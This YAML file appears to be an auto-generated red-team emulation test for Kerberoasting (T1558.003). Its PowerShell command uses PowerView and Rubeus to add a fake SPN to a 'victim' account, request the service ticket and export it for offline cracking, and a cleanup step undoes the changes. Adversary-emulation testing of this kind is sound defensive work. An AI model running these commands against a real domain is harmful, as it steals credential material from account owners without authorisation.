# Auto-generated by CIPHER v5.0
# Source: db4fb4d971cd
attack_technique: T1558.003
display_name: "T1558.003 - Targeted Kerberoasting (Add SPN & Roast)"
atomic_tests:
  - name: "T1558.003 - Targeted Kerberoasting (Add SPN & Roast)"
    description: |
      Add a malicious SPN to a victim account that the attacker has GenericAll on, request a TGS for the SPN, and export the ticket for offline cracking.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Import-Module PowerView;
        # Verify GenericAll
        Get-ObjectAcl -SamAccountName victim | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"};
        # Add fake SPN
        Set-ADUser -Identity victim -ServicePrincipalName "http/fake-spn.lab.local";
        # Request TGS via Rubeus
        C:\Tools\Rubeus.exe kerberoast /spn:http/fake-spn.lab.local /outfile:C:\Temp\fake_spn.kirbi;
      cleanup_command: |
        Set-ADUser -Identity victim -Clear ServicePrincipalName; Remove-Item C:\Temp\fake_spn.kirbi -Force
